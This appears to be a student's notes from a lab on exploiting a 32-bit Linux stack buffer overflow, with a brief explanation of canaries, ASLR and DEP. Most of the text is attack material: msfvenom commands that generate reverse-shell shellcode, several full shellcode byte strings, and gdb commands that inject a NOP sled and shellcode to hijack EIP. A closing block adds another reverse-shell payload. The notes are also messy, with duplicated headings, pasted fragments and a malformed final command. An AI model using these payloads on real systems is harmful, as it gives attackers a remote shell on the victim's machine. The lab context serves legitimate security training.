## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [MSFvenom - Generate Shellcode](#MSFvenom\-\Generate\Shellcode)
      - [Shellcode](#Shellcode)
      - [Notes](#Notes)
      - [Exploit with Shellcode](#Exploit\with\Shellcode)
      - [The Stack](#The\Stack)
      - [Character List](#Character\List)
      - [Calculate CHARS Length](#Calculate\CHARS\Length)
      - [Notes](#Notes)
- [Identification of the Return Address](#identification\of\the\return\address)
      - [GDB NOPS](#GDB\NOPS)
- [Prevention Techniques and Mechanisms](#prevention\techniques\and\mechanisms)
  - [Canaries](#Canaries)
  - [Address Space Layout Randomization (ASLR)](#Address\Space\Layout\Randomization\(ASLR))
  - [Data Execution Prevention (DEP)](#Data\Execution\Prevention\(DEP))

## Table of Contents

      - [MSFvenom - Generate Shellcode](#MSFvenom\-\Generate\Shellcode)
      - [Shellcode](#Shellcode)
      - [Notes](#Notes)
      - [Exploit with Shellcode](#Exploit\with\Shellcode)
      - [The Stack](#The\Stack)
      - [Character List](#Character\List)
      - [Calculate CHARS Length](#Calculate\CHARS\Length)
      - [Notes](#Notes)
- [Identification of the Return Address](#identification\of\the\return\address)
      - [GDB NOPS](#GDB\NOPS)
- [Prevention Techniques and Mechanisms](#prevention\techniques\and\mechanisms)
  - [Canaries](#Canaries)
  - [Address Space Layout Randomization (ASLR)](#Address\Space\Layout\Randomization\(ASLR))
  - [Data Execution Prevention (DEP)](#Data\Execution\Prevention\(DEP))

msfvenom shellcode payload syntax:
  
MSFvenom Syntax

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```
#### MSFvenom - Generate Shellcode

  MSFvenom - Generate Shellcode

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```
#### Shellcode

  Shellcode

```shell-session
gdxqpardo@htb[/htb]$ cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>
```
Now that we have our shellcode, we adjust it to have only one string, and then we can adapt and submit our simple exploit again.

#### Notes

  Notes

```shell-session
   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
     NOPs = "\x90" * 124
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

#### Exploit with Shellcode

  Exploit with Shellcode

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

Next, we check if the first bytes of our shellcode match the bytes after the NOPS.

#### The Stack

  The Stack

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd64c:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd654:	0x90	0x90	0x90	0x90	0x90	0x90	0x90	0x90
0xffffd65c:	0x90	0x90	0xda	0xca	0xba	0xe4	0x11	0xd4
						 # |----> Shellcode begins
<SNIP>
```"\xba\xca\x8b\x27\xfa\xdb\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x0e\x03\x9a\x85\xc5\x0f\x2b\x41\xfe\x13\x18\x36\x52\xbe\x9c\x31\xb5\x8e\xc6\x8c\xb6\x7c\x5f\xbf\x88\x4f\xdf\xf6\x8f\xb6\xb7\x02\x7a\x46\x44\x7b\x78\x58\x51\x42\xf5\xb9\xd5\xd2\x55\x6b\x46\xa8\x55\x02\x89\x03\xd9\x46\x21\xf2\xf5\x15\xd9\x62\x25\xf5\x7b\x1a\xb0\xea\x29\x8f\x4b\x0d\x7d\x24\x81\x4e"








run $(python -c 'print("\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xba\xca\x8b\x27\xfa\xdb\xd0\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x12\x83\xe8\xfc\x31\x50\x0e\x03\x9a\x85\xc5\x0f\x2b\x41\xfe\x13\x18\x36\x52\xbe\x9c\x31\xb5\x8e\xc6\x8c\xb6\x7c\x5f\xbf\x88\x4f\xdf\xf6\x8f\xb6\xb7\x02\x7a\x46\x44\x7b\x78\x58\x51\x42\xf5\xb9\xd5\xd2\x55\x6b\x46\xa8\x55\x02\x89\x03\xd9\x46\x21\xf2\xf5\x15\xd9\x62\x25\xf5\x7b\x1a\xb0\xea\x29\x8f\x4b\x0d\x7d\x24\x81\x4e" + "\x66" * 4)')



#### Character List

  Character List

```shell-session
gdxqpardo@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
^^^ Chars to avoid when generating shellcode.

#### Calculate CHARS Length

  Calculate CHARS Length

```shell-session
gdxqpardo@htb[/htb]$ echo $CHARS | sed 's/\\x/ /g' | wc -w
```
This string is `256` bytes long. So we need to calculate our buffer again.

#### Notes

  Notes

```shell-session
Buffer = "\x55" * (1040 - 256 - 4) = 780
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```
```shell-session
"\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
```
\x00\x09\x0a\x20

"\xdb\xca\xd9\x74\x24\xf4\xbb\x82\xfc\x62\x5f\x5f\x29\xc9\xb1\x12\x31\x5f\x17\x03\x5f\x17\x83\x45\xf8\x80\xaa\x78\xda\xb2\xb6\x29\x9f\x6f\x53\xcf\x96\x71\x13\xa9\x65\xf1\xc7\x6c\xc6\xcd\x2a\x0e\x6f\x4b\x4c\x66\x7a\xa1\xa1\x75\x12\xb7\xbd\x62\xdb\x3e\x5c\x24\x7d\x11\xce\x17\x31\x92\x79\x76\xf8\x15\x2b\x10\x6d\x39\xbf\x88\x19\x6a\x10\x2a\xb3\xfd\x8d\xf8\x10\x77\xb0\x4c\x9d\x4a\xb3"
```

**Submit the size of the stack space after overwriting the EIP as the answer**
`(gdb)$ info proc all`
0x21000

# Identification of the Return Address

---

After checking that we still control the EIP with our shellcode, we now need a memory address where our NOPs are located to tell the EIP to jump to it. This memory address must not contain any of the bad characters we found previously.
#### GDB NOPS

  GDB NOPS

```shell-session
(gdb) x/2000xb $esp+1400
```
```
Buffer  = "\\x55" \* (1040 - 100 - 95 - 4) = 841
NOPs = "\\x90" \* 100
shellcode = "\xdb\xca\xd9\x74\x24\xf4\xbb\x82\xfc\x62\x5f\x5f\x29\xc9\xb1\x12\x31\x5f\x17\x03\x5f\x17\x83\x45\xf8\x80\xaa\x78\xda\xb2\xb6\x29\x9f\x6f\x53\xcf\x96\x71\x13\xa9\x65\xf1\xc7\x6c\xc6\xcd\x2a\x0e\x6f\x4b\x4c\x66\x7a\xa1\xa1\x75\x12\xb7\xbd\x62\xdb\x3e\x5c\x24\x7d\x11\xce\x17\x31\x92\x79\x76\xf8\x15\x2b\x10\x6d\x39\xbf\x88\x19\x6a\x10\x2a\xb3\xfd\x8d\xf8\x10\x77\xb0\x4c\x9d\x4a\xb3"
EIP = "\xff\xff\d7\x38"
```
# Prevention Techniques and Mechanisms

---

The best protection against buffer overflows is security-conscious programming. Software developers should inform themselves about the relevant pitfalls and strive for deliberately secure programming. Besides, there are security mechanisms that support developers and prevent users from exploiting such vulnerabilities.

These include security mechanisms:

- `Canaries`
- `Address Space Layout Randomization` (`ASLR`)
- `Data Execution Prevention` (`DEP`)

---

## Canaries

The `canaries` are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.

---

## Address Space Layout Randomization (ASLR)

Address Space Layout Randomization (`ASLR`) is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.

---

## Data Execution Prevention (DEP)

`DEP` is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.



```
EIP: 0x66666666
786
2060 to overflow
\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd
\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x0a\x0a\x0f
\x03\x68\x02\x00\x1b\x39\x89\xe1\xb0\x66\x50\x51\x53\xb3
\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f
\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80

identify bad chars:
buffer = "\x55" * (2064 - 256 - 4)
CHARS=...
EIP = "\x66" * 4
```

`run $(python -c 'print("\x55" * (2064 - 100 - 95 - 4) + "\x90" * 100 + ""\xd9\xe8\xd9\x74\x24\xf4\xbf\xd5\xc2\xbf\x35\x5b\x31\xc9\xb1\x12\x83\xeb\xfc\x31\x7b\x13\x03\xae\xd1\x5d\xc0\x61\x0d\x56\xc8\xd2\xf2\xca\x65\xd6\x7d\x0d\xc9\xb0\xb0\x4e\xb9\x65\xfb\x70\x73\x15\xb2\xf7\x72\x7d\x4f\x02\x8a\x7e\x27\x10\x94\x9b\x8e\x9d\x75\x2b\x96\xcd\x24\x18\xe4\xed\x4f\x7f\xc7\x72\x1d\x17\xb6\x5d\xd1\x8f\x2e\x8d\x3a\x2d\xc6\x58\xa7\xe3\x4b\xd2\xc9\xb3\x67\x29\x89" + "\x66" * 4)')'*)'`